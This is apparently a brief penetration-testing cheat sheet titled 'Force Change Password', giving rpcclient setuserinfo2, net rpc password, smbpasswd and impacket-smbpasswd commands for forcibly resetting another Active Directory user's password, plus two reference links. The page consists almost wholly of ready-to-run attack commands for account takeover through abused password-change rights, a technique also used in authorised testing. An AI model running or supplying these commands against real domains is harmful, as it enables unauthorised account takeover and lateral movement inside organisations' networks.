# Force Change Password

### rpcclient

```
setuserinfo2 username 23 'P@ssw0rd123!'
net rpc password [pwd4userUwant2change] -U [userWithPwdChangePerms] -S 192.168.80.10
```

{% embed url="https://bitvijays.github.io/LFF-IPS-P3-Exploitation.html" %}

{% embed url="https://room362.com/post/2017/reset-ad-user-password-with-linux/" %}

### smb

```
smbpasswd -U user -r domain.local
impacket-smbpasswd user:oldPassword@domain.local -newpass P@ssw0rd123
```
